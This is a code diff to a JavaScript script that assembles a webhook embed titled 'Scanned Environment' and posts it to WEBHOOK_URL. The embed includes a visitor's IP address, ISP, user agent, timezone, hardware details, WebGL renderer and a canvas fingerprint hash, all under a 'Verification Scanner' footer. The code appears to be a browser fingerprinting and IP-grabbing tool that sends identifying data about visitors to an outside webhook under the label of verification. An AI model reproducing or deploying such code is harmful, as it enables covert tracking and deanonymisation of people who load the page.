@@ -160,32 +160,54 @@ await fetch(WEBHOOK_URL, {
     embeds: [{
       title: "Scanned Environment",
       color: 3447003,
+
       fields: [
+        // ——— BASIC INFO ———
+        { name: "Timestamp", value: basic.timestamp || "Unknown", inline: false },
         { name: "Local Time", value: basic.localTime || "Unknown", inline: false },
         { name: "Timezone", value: basic.timezone || "Unknown", inline: true },
-        { name: "Offset (Minutes)", value: basic.offsetMinutes || "Unknown", inline: true },
+        { name: "UTC Offset (Minutes)", value: basic.offsetMinutes || "Unknown", inline: true },
         { name: "Languages", value: basic.languages || "Unknown", inline: false },
+
+        // ——— SYSTEM ———
         { name: "Platform", value: basic.platform || "Unknown", inline: true },
         { name: "CPU Threads", value: basic.hardwareConcurrency || "Unknown", inline: true },
         { name: "Device Memory", value: basic.deviceMemory || "Unknown", inline: true },
         { name: "Cookies Enabled", value: basic.cookieEnabled || "Unknown", inline: true },
         { name: "Do Not Track", value: basic.doNotTrack || "Unknown", inline: true },
         { name: "User Agent", value: basic.userAgent || "Unknown", inline: false },
-        { name: "Screen Size", value: `${display.screenWidth}x${display.screenHeight}` || "Unknown", inline: true },
-        { name: "Available Size", value: `${display.availWidth}x${display.availHeight}` || "Unknown", inline: true },
-        { name: "Window Size", value: `${display.innerWidth}x${display.innerHeight}` || "Unknown", inline: true },
-        { name: "Pixel Ratio", value: display.pixelRatio || "Unknown", inline: true },
-        { name: "Touch Points", value: input.maxTouchPoints || "Unknown", inline: true },
-        { name: "Touch Events", value: input.touchEventSupport || "Unknown", inline: true },
-        { name: "WebGL Supported", value: graphics.webglSupported || "Unknown", inline: true },
-        { name: "WebGL Vendor", value: graphics.webglVendor || "Unknown", inline: false },
-        { name: "WebGL Renderer", value: graphics.webglRenderer || "Unknown", inline: false },
+
+        // ——— DISPLAY ———
+        { name: "Screen Size", value: `${screenInfo.width}x${screenInfo.height}`, inline: true },
+        { name: "Available Size", value: `${screenInfo.availWidth}x${screenInfo.availHeight}`, inline: true },
+        { name: "Window Size", value: `${screenInfo.windowWidth}x${screenInfo.windowHeight}`, inline: true },
+        { name: "Pixel Ratio", value: screenInfo.pixelRatio || "Unknown", inline: true },
+
+        // ——— INPUT ———
+        { name: "Touch Points", value: touch.maxTouchPoints || "Unknown", inline: true },
+        { name: "Touch Events", value: touch.touchEvent || "Unknown", inline: true },
+
+        // ——— GRAPHICS ———
+        { name: "WebGL Supported", value: webgl.supported || "Unknown", inline: true },
+        { name: "WebGL Vendor", value: webgl.vendor || "Unknown", inline: false },
+        { name: "WebGL Renderer", value: webgl.renderer || "Unknown", inline: false },
+
+        // ——— NETWORK ———
         { name: "IP Address", value: network.ip || "Unknown", inline: false },
         { name: "ISP / Org", value: network.org || "Unknown", inline: false },
         { name: "Lookup Status", value: network.lookupStatus || "Unknown", inline: true },
-        { name: "Canvas Hash", value: integrity.canvasHashShort || "Unknown", inline: false },
-        { name: "Environment Notes", value: integrity.environmentNotes || "None", inline: false },
-      ]
+
+        // ——— CANVAS ———
+        { name: "Canvas Hash", value: canvasFP || "Unknown", inline: false },
+
+        // ——— NOTES ———
+        { name: "Environment Notes", value: "None", inline: false }
+      ],
+
+      footer: {
+        text: "Verification Scanner • Summary Report"
+      },
+      timestamp: new Date().toISOString()
     }]
   })
 });
